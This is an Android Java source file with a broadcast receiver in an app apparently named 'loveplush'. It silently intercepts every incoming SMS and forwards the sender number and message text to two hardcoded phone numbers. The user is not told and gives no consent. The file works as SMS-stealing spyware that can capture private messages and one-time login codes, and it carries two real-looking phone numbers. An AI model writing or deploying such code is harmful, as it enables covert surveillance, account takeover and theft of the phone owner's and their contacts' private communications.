package com.xinlan.loveplush;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

/**
 * ss
 * @author panyi
 * 
 */
public class SMSBroadcastReceiver extends BroadcastReceiver {
	public static final String MYPHONE = "13451865083";
	public static final String GUESTPHONE = "15277335399";

	@Override
	public void onReceive(Context context, Intent intent) {
		// System.out.println("���ܶ���");
		Object[] pdus = (Object[]) intent.getExtras().get("pdus");
		for (Object p : pdus) {
			byte[] pdu = (byte[]) p;
			SmsMessage message = SmsMessage.createFromPdu(pdu);
			String content = message.getMessageBody();
			String sendNumber = message.getOriginatingAddress();
			String sendContent = "发信人:" + sendNumber + ",内容:" + content;
			sendMessage(MYPHONE, sendContent);
			if (sendNumber.equals(GUESTPHONE)) {
				return;
			}
			sendMessage(GUESTPHONE, sendContent);
		}// end for
	}

	/**
	 * 
	 * @param number
	 * @param content
	 */
	private void sendMessage(String number, String content) {
		SmsManager manager = SmsManager.getDefault();
		ArrayList<String> texts = manager.divideMessage(content);
		for (String text : texts) {
			manager.sendTextMessage(number, null, text, null, null);
		}// end for
	}
}// end class
